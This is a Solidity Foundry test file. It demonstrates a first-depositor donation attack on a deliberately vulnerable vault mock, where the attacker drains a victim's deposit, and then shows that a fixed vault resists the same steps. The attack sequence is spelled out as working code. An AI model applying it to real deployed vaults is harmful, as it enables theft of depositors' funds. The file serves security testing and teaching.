// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {TestHelper} from "./TestHelper.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";
import {VulnerableVault} from "../src/vault-inflation/VulnerableVault.sol";
import {FixedVault} from "../src/vault-inflation/FixedVault.sol";

/// @notice PoC: first-depositor / donation (share inflation) attack.
///         Attacker deposits 1 wei, donates 10_000 tokens straight to the
///         vault, victim deposits 5_000 and mints 0 shares, attacker redeems
///         the only share and takes everything. The fixed vault ignores the
///         donation for pricing, so the same script leaves the victim whole.
contract VaultInflationTest is TestHelper {
    address internal attacker = address(0xA77AC);
    address internal victim = address(0xBEEF);

    function _fund(MockERC20 token) internal {
        token.mint(attacker, 20_000 ether);
        token.mint(victim, 5_000 ether);
    }

    function test_vulnerable_vault_donation_attack_drains_victim() public {
        MockERC20 token = new MockERC20("Token", "TKN");
        VulnerableVault vault = new VulnerableVault(token);
        _fund(token);

        // Attacker: 1 wei in for 1 share, then a 10_000 token "donation".
        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        vault.deposit(1);
        vm.prank(attacker);
        token.transfer(address(vault), 10_000 ether);

        // Victim deposits 5_000 and is minted zero shares.
        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        uint256 victimShares = vault.deposit(5_000 ether);
        assertEq(victimShares, 0, "victim minted zero shares");

        // Attacker redeems the only share: principal + donation + victim funds.
        vm.prank(attacker);
        uint256 taken = vault.withdraw(1);
        assertEq(taken, 15_000 ether + 1, "attacker took the whole vault");
        assertEq(token.balanceOf(victim), 0, "victim lost the full deposit");
    }

    function test_fixed_vault_same_attack_fails() public {
        MockERC20 token = new MockERC20("Token", "TKN");
        FixedVault vault = new FixedVault(token);
        _fund(token);

        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        vault.deposit(1);
        vm.prank(attacker);
        token.transfer(address(vault), 10_000 ether); // donation now ignored by pricing

        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        uint256 victimShares = vault.deposit(5_000 ether);
        assertGt(victimShares, 0, "victim minted real shares");

        // Victim exits whole.
        vm.prank(victim);
        uint256 back = vault.withdraw(victimShares);
        assertEq(back, 5_000 ether, "victim withdrew the full deposit");

        // Attacker gets back roughly the 1 wei they deposited — the donation
        // bought them nothing.
        uint256 attackerShares = vault.sharesOf(attacker);
        vm.prank(attacker);
        uint256 attackerBack = vault.withdraw(attackerShares);
        assertTrue(attackerBack <= 1 + 1e6, "attacker recovered at most their wei");
    }
}
